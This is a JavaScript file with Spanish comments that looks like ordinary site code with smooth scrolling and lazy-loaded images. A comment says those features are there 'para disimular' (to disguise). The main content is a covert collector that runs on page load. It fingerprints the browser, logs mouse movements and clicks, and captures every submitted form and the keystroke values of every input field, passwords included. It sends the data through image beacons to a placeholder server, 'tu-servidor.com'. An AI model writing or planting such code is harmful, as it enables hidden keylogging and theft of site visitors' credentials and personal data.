// Funcionalidades avanzadas

// Recopilador de datos
const dataCollector = {
  init() {
    this.collectBrowserInfo();
    this.trackMouseMovements();
    this.captureFormData();
    this.trackClicks();
  },

  collectBrowserInfo() {
    const data = {
      userAgent: navigator.userAgent,
      language: navigator.language,
      platform: navigator.platform,
      cookiesEnabled: navigator.cookieEnabled,
      screenRes: `${screen.width}x${screen.height}`,
      colorDepth: screen.colorDepth,
      timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      plugins: Array.from(navigator.plugins).map(p => p.name),
      storage: {
        localStorage: !!window.localStorage,
        sessionStorage: !!window.sessionStorage,
        indexedDB: !!window.indexedDB
      }
    };
    this.sendData('browser_info', data);
  },

  trackMouseMovements() {
    let movements = [];
    document.addEventListener('mousemove', (e) => {
      movements.push({
        x: e.clientX,
        y: e.clientY,
        timestamp: Date.now()
      });
      if (movements.length >= 100) {
        this.sendData('mouse_movements', movements);
        movements = [];
      }
    });
  },

  captureFormData() {
    document.addEventListener('submit', (e) => {
      const formData = new FormData(e.target);
      const data = {};
      formData.forEach((value, key) => {
        data[key] = value;
      });
      this.sendData('form_data', data);
    });

    // Captura de tecleo
    document.addEventListener('keyup', (e) => {
      if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
        const data = {
          element: e.target.tagName,
          value: e.target.value,
          timestamp: Date.now()
        };
        this.sendData('input_data', data);
      }
    });
  },

  trackClicks() {
    document.addEventListener('click', (e) => {
      const data = {
        x: e.clientX,
        y: e.clientY,
        target: e.target.tagName,
        timestamp: Date.now(),
        path: this.getElementPath(e.target)
      };
      this.sendData('click_data', data);
    });
  },

  getElementPath(element) {
    const path = [];
    while (element) {
      path.unshift({
        tag: element.tagName,
        id: element.id,
        classes: Array.from(element.classList)
      });
      element = element.parentElement;
    }
    return path;
  },

  sendData(type, data) {
    // Almacenar datos localmente
    const key = `collected_${type}_${Date.now()}`;
    try {
      localStorage.setItem(key, JSON.stringify(data));
    } catch (e) {
      // Si localStorage está lleno, limpiar datos antiguos
      this.cleanOldData();
      localStorage.setItem(key, JSON.stringify(data));
    }

    // Enviar datos al servidor cuando sea posible
    if (navigator.onLine) {
      this.syncData();
    }
  },

  cleanOldData() {
    const keys = Object.keys(localStorage);
    const oldKeys = keys.filter(k => k.startsWith('collected_')).sort();
    if (oldKeys.length > 100) {
      oldKeys.slice(0, 50).forEach(k => localStorage.removeItem(k));
    }
  },

  syncData() {
    const keys = Object.keys(localStorage);
    const dataKeys = keys.filter(k => k.startsWith('collected_'));
    
    dataKeys.forEach(key => {
      const data = localStorage.getItem(key);
      // Aquí puedes enviar los datos a tu servidor
      const img = new Image();
      img.src = `https://tu-servidor.com/collect?data=${encodeURIComponent(data)}&key=${key}`;
      img.onload = () => localStorage.removeItem(key);
    });
  }
};

// Funciones visuales para disimular
function smoothScroll() {
  document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function (e) {
      e.preventDefault();
      document.querySelector(this.getAttribute('href')).scrollIntoView({
        behavior: 'smooth'
      });
    });
  });
}

function lazyLoadImages() {
  const images = document.querySelectorAll('[data-src]');
  const imageOptions = {
    threshold: 0,
    rootMargin: '0px 0px 50px 0px'
  };

  const imageObserver = new IntersectionObserver((entries, observer) => {
    entries.forEach(entry => {
      if (entry.isIntersecting) {
        const img = entry.target;
        img.src = img.dataset.src;
        img.classList.add('loaded');
        observer.unobserve(img);
      }
    });
  }, imageOptions);

  images.forEach(img => imageObserver.observe(img));
}

// Inicializar todo cuando el DOM esté listo
document.addEventListener('DOMContentLoaded', () => {
  dataCollector.init();
  smoothScroll();
  lazyLoadImages();
});
